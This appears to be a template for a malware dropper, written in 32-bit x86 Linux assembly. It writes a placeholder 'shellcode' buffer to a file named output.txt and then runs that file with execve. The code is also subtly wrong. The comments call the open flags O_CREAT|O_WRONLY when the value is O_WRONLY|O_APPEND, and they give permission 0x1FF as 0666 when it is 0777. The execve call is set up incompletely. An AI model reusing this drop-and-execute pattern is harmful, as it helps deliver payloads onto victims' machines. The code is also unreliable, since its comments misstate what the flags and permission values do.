section .text
global _start

_start:
    ; Open a file for writing (replace 'output.txt' with your desired filename)
    mov eax, 5          ; sys_open syscall number
    mov ebx, filename  ; filename pointer
    mov ecx, 0x1 | 0x400  ; O_CREAT | O_WRONLY
    mov edx, 0x1FF  ; File permissions (0666 in octal)
    int 0x80            ; Call syscall

    ; Check for successful file open
    test eax, eax
    js open_failed

    ; Write shellcode to the file
    mov ebx, eax        ; File descriptor
    mov ecx, shellcode  ; Pointer to shellcode
    mov edx, shellcode_size  ; Size of shellcode
    mov eax, 4          ; sys_write syscall number
    int 0x80            ; Call syscall

    ; Close the file
    mov eax, 6          ; sys_close syscall number
    int 0x80            ; Call syscall

    ; Execute the dropped shellcode
    mov ebx, filename  ; Execute the dropped file
    mov eax, 11         ; sys_execve syscall number
    int 0x80            ; Call syscall

open_failed:
    ; Handle open failure here

section .data
filename db 'output.txt',0
shellcode db 'Your custom shellcode here',0
shellcode_size equ $ - shellcode
